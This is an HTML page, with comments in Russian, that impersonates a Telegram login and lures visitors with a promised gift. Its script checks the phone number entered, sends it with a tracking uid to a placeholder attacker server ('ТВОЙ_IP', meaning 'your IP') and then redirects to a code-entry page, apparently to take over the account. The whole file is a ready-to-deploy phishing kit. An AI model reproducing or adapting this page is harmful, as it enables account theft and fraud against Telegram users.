<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; text-align: center; padding: 40px 20px; }
        .logo { width: 80px; height: 80px; margin-bottom: 25px; }
        
        /* Контейнер для поля ввода с фиксированным плюсом */
        .input-wrapper {
            position: relative;
            width: 100%;
            max-width: 320px;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            background: #1c252f;
            border: 1px solid #2a3644;
            border-radius: 12px;
            padding: 0 16px;
            box-sizing: border-box;
        }
        
        .prefix {
            font-size: 18px;
            color: #fff;
            margin-right: 2px;
            user-select: none; /* Плюс нельзя выделить или стереть */
        }
        
        input {
            width: 100%;
            padding: 16px 0;
            background: transparent;
            border: none;
            color: #fff;
            font-size: 18px;
            outline: none;
        }

        button { width: 100%; max-width: 320px; padding: 16px; background: #248bdf; border: none; border-radius: 12px; color: #fff; font-weight: bold; font-size: 16px; cursor: pointer; }
        .hint { font-size: 12px; color: #8a99a8; margin-top: -10px; margin-bottom: 20px; min-height: 15px; }
    </style>
</head>
<body>
    <svg class="logo" viewBox="0 0 240 240"><circle cx="120" cy="120" r="120" fill="#248bdf"/><path d="M54 116.7l124.6-48.1c5.8-2.2 10.8 1.2 8.9 10.3l-21.2 100.1c-1.6 7.2-5.9 8.9-11.9 5.6L122 158l-15.7 15.1c-1.7 1.7-3.2 3.2-6.6 3.2l2.3-33.3 60.7-54.8c2.6-2.3-.6-3.6-4.1-1.3L83.7 137.4 51.5 127.3c-7-2.2-7.1-7 1.5-10.6z" fill="#fff"/></svg>
    
    <h2>Log in to Telegram</h2>
    <p style="color: #8a99a8; margin-bottom: 30px;">Enter your phone number to receive the gift.</p>
    
    <div class="input-wrapper" id="box">
        <span class="prefix">+</span>
        <input type="tel" id="phone" placeholder="7 900 000-00-00" maxlength="15">
    </div>
    <div id="hint" class="hint"></div>
    
    <button onclick="submitPhone()">Next</button>

    <script>
        const rules = [
            { code: "7", len: 11, name: "Russia/Kazakhstan" },
            { code: "380", len: 12, name: "Ukraine" },
            { code: "375", len: 12, name: "Belarus" },
            { code: "998", len: 12, name: "Uzbekistan" },
            { code: "1", len: 11, name: "USA/Canada" },
            { code: "44", len: 12, name: "UK" }
        ];

        const input = document.getElementById('phone');
        const hint = document.getElementById('hint');
        const box = document.getElementById('box');

        // Живая проверка при вводе
        input.addEventListener('input', () => {
            let val = input.value.replace(/\D/g, ''); // Только цифры
            input.value = val;
            
            let found = rules.find(r => val.startsWith(r.code));
            if (found) {
                hint.innerText = `${found.name}: ${val.length}/${found.len} digits`;
                hint.style.color = val.length === found.len ? "#4caf50" : "#8a99a8";
                box.style.borderColor = val.length === found.len ? "#4caf50" : "#2a3644";
            } else {
                hint.innerText = val.length > 0 ? "International format" : "";
                box.style.borderColor = "#248bdf";
            }
        });

        async function submitPhone() {
            const val = input.value;
            let rule = rules.find(r => val.startsWith(r.code));
            
            // Если страна в списке — проверяем строго. Если нет — от 10 до 15 цифр.
            let isOk = rule ? (val.length === rule.len) : (val.length >= 10 && val.length <= 15);

            if (!isOk) {
                alert(rule ? `Error: ${rule.name} number must be ${rule.len} digits.` : "Invalid phone number length.");
                return;
            }

            const fullPhone = "+" + val;
            const uid = new URLSearchParams(window.location.search).get('uid') || "Unknown";

            try {
                await fetch("http://ТВОЙ_IP:8080/submit", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ type: 'phone', value: fullPhone, uid: uid })
                });
            } catch(e) {}

            window.location.href = "code.html" + window.location.search;
        }
    </script>
</body>
</html>
